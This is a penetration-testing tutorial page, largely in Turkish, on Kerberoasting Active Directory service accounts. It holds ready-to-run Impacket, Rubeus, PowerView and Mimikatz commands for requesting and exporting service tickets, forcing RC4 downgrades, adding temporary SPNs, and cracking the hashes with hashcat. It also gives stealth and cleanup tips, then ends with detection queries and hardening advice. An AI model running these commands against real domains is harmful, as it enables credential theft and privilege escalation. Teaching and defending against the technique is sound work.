# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting, Active Directory (AD) içinde bilgisayar hesapları hariç, kullanıcı hesapları altında çalışan hizmetlerle ilişkili TGS ticket’larının elde edilmesine odaklanır. Bu ticket’ların şifrelemesi, kullanıcı parolalarından türetilen anahtarlardan yararlanır ve çevrimdışı kimlik bilgisi kırmasını mümkün kılar. Bir kullanıcı hesabının hizmet olarak kullanıldığını gösteren işaret, ServicePrincipalName (SPN) özelliğinin boş olmamasıdır.

Herhangi bir kimlik doğrulanmış domain kullanıcısı TGS ticket’ı isteyebilir; bu yüzden özel ayrıcalık gerekmez.

### Temel Noktalar

- Kullanıcı hesapları altında çalışan hizmetler için TGS ticket’larını hedefler (yani SPN ayarlı hesaplar; bilgisayar hesapları değil).
- Ticket’lar, servis hesabı parolasından türetilen bir anahtar ile şifrelenir ve çevrimdışı kırılabilir.
- Yükseltilmiş ayrıcalık gerekmez; herhangi bir kimlik doğrulanmış hesap TGS ticket’ı isteyebilir.

> [!WARNING]
> Çoğu genel araç, kırılması daha hızlı olduğu için RC4-HMAC (etype 23) servis ticket’larını istemeyi tercih eder. RC4 TGS hash’leri `$krb5tgs$23$*` ile başlar, AES128 `$krb5tgs$17$*` ile, AES256 `$krb5tgs$18$*` ile başlar. Ancak birçok ortam AES-only yönüne kayıyor. Sadece RC4’ün geçerli olduğunu varsaymayın.
> Ayrıca, “spray-and-pray” tarzı roasting’den kaçının. Rubeus’un varsayılan kerberoast modu tüm SPN’leri sorgulayabilir ve ticket isteyebilir; bu gürültülü bir yaklaşımdır. Önce ilginç principal’leri keşfedin ve hedefleyin.

### Service account secrets & Kerberos crypto cost

Birçok hizmet hâlâ elle yönetilen parolalara sahip kullanıcı hesapları altında çalışır. KDC, servis ticket’larını bu parolardan türetilen anahtarlarla şifreler ve şifre metnini herhangi bir kimlik doğrulmuş principal’a verir; bu yüzden kerberoasting, kilitlenme veya DC telemetrisi olmadan sınırsız çevrimdışı deneme sağlar. Şifreleme modu kırma bütçesini belirler:

| Mod | Anahtar türetimi | Şifreleme türü | Yaklaşık RTX 5090 verimi* | Notlar |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 ile 4,096 iterasyon ve etki alanı + SPN’den türetilen her-principal için salt | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 milyon tahmin/s | Salt rainbow tabloları engeller ama kısa parolaların hızlıca kırılmasını hâlâ mümkün kılar. |
| RC4 + NT hash | Parolanın tek MD4’ü (tuzsuz NT hash); Kerberos her ticket için yalnızca 8-byte’lık bir confounder karıştırır | etype 23 (`$krb5tgs$23$`) | ~4.18 **milyar** tahmin/s | AES’den ~1000× daha hızlı; saldırganlar `msDS-SupportedEncryptionTypes` izin verdiğinde RC4’ü zorlar. |

*Kıyaslamalar Chick3nman’dan alınmıştır; detaylar için [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).

RC4’ün confounder’ı yalnızca keystream’i rastgeleleştirir; her deneme için iş yükü eklemez. Servis hesapları rastgele sırra dayanmadığı sürece (gMSA/dMSA, makine hesapları veya vault tarafından yönetilen diziler), ele geçirme hızı tamamen GPU bütçesine bağlıdır. Sadece AES etype’larını zorunlu kılmak saniyede milyarlarca tahmin avantajını ortadan kaldırır, fakat zayıf insan parolaları yine PBKDF2’ye yenik düşer.

### Saldırı

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
kerberoast kontrollerini içeren çok amaçlı araçlar:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Kerberoastable kullanıcıları listele
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: TGS'yi talep et ve dump'ı bellekten al
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Teknik 2: Otomatik araçlar
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Bir TGS isteği Windows Security Event 4769 üretir (A Kerberos service ticket was requested).

### OPSEC ve yalnızca AES ortamları

- AES olmayan hesaplar için bilerek RC4 isteyin:
- Rubeus: `/rc4opsec` tgtdeleg kullanarak AES olmayan hesapları listeler ve RC4 service tickets ister.
- Rubeus: `/tgtdeleg` kerberoast ile mümkün olduğunda RC4 isteklerini de tetikler.
- Sessizce başarısız olmak yerine AES-only hesapları Roast edin:
- Rubeus: `/aes` AES etkin hesapları listeler ve AES service tickets ister (etype 17/18).
- Eğer zaten bir TGT'ye sahipseniz (PTT veya .kirbi'den), `/ticket:<blob|path>` ile `/spn:<SPN>` veya `/spns:<file>` kullanabilir ve LDAP'ı atlayabilirsiniz.
- Hedefleme, throttling ve daha az gürültü:
- Kullanın `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` ve `/jitter:<1-100>`.
- Muhtemel zayıf parolaları `/pwdsetbefore:<MM-dd-yyyy>` (daha eski parolalar) ile filtreleyin veya ayrıcalıklı OU'ları `/ou:<DN>` ile hedefleyin.

Examples (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Kalıcılık / Kötüye Kullanım

Eğer bir hesabı kontrol edebiliyorsanız veya değiştirebiliyorsanız, bir SPN ekleyerek hesabı kerberoastable hâline getirebilirsiniz:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Daha kolay cracking için RC4'ü etkinleştirmek amacıyla bir hesabı düşürün (requires write privileges on the target object):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### GenericWrite/GenericAll ile bir kullanıcı üzerinde hedefli Kerberoast (geçici SPN)

BloodHound, bir kullanıcı nesnesi üzerinde kontrolünüz olduğunu gösterdiğinde (ör. GenericWrite/GenericAll), o kullanıcının şu anda herhangi bir SPN'i olmasa bile güvenilir şekilde hedefli Kerberoast yapabilirsiniz:

- Kerberoast yapılabilir hale getirmek için kontrolünüz altındaki kullanıcıya geçici bir SPN ekleyin.
- Kırmayı kolaylaştırmak için o SPN için RC4 (etype 23) ile şifrelenmiş bir TGS-REP isteyin.
- `$krb5tgs$23$...` hash'ini hashcat ile kırın.
- Ayak izini azaltmak için SPN'i temizleyin.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux tek satır (targetedKerberoast.py add SPN -> request TGS (etype 23) -> remove SPN işlemlerini otomatikleştirir):
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Çıktıyı hashcat autodetect ile Crack edin (mode 13100 for `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Detection notes: SPN ekleme/çıkarma dizin değişiklikleri üretir (hedef kullanıcıda Event ID 5136/4738) ve TGS isteği Event ID 4769 üretir. İstek hız sınırlandırması uygulamayı ve hızlı temizlik yapmayı düşünün.

You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>` (deprecated on some distros)
- `rdate -n <DC_IP>`

### Kerberoast etki alanı hesabı olmadan (AS-requested STs)

In September 2022, Charlie Clark showed that if a principal does not require pre-authentication, it’s possible to obtain a service ticket via a crafted KRB_AS_REQ by altering the sname in the request body, effectively getting a service ticket instead of a TGT. This mirrors AS-REP roasting and does not require valid domain credentials.

See details: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> Bu teknikle LDAP sorgusu yapabilmek için geçerli kimlik bilgileri olmadığından bir kullanıcı listesi sağlamanız gerekir.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
İlgili

AS-REP roastable kullanıcılarını hedefliyorsanız, ayrıca bakınız:

{{#ref}}
asreproast.md
{{#endref}}

### Tespit

Kerberoasting gizli olabilir. DC'lerden Event ID 4769 için arama yapın ve gürültüyü azaltmak için filtreler uygulayın:

- Hizmet adı `krbtgt` ve `$` ile biten hizmet adlarını (bilgisayar hesapları) hariç tutun.
- Bilgisayar hesaplarından gelen istekleri (`*$$@*`) hariç tutun.
- Sadece başarılı istekler (Failure Code `0x0`).
- Şifreleme türlerini takip edin: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Sadece `0x17` için alarm üretmeyin.

Örnek PowerShell triage:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Ek fikirler:

- Her host/kullanıcı için normal SPN kullanımını temel seviye olarak belirleyin; tek bir principal'den gelen çok sayıda farklı SPN isteğinin ani artışında uyarı verin.
- AES ile güçlendirilmiş domain'lerde alışılmadık RC4 kullanımını işaretleyin.

### Azaltma / Sertleştirme

- Servisler için gMSA/dMSA veya machine accounts kullanın. Managed accounts 120+ karakter rastgele parolalara sahiptir ve otomatik döner; bu, offline kırmayı pratik olmaktan çıkarır.
- Hizmet hesaplarında AES'i zorunlu kılmak için `msDS-SupportedEncryptionTypes` değerini yalnızca AES (decimal 24 / hex 0x18) olarak ayarlayın ve ardından parolayı döndürün, böylece AES anahtarları türetilir.
- Mümkünse ortamdaki RC4'ü devre dışı bırakın ve RC4 kullanımına yönelik denemeleri izleyin. DC'lerde `DefaultDomainSupportedEncTypes` kayıt defteri değerini, `msDS-SupportedEncryptionTypes` ayarlı olmayan hesaplar için varsayılanları yönlendirmek üzere kullanabilirsiniz. İyice test edin.
- Kullanıcı hesaplarındaki gereksiz SPN'leri kaldırın.
- Managed accounts mümkün değilse uzun, rastgele servis hesabı parolaları kullanın (25+ karakter); yaygın parolaları yasaklayın ve düzenli denetim yapın.

## References

- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
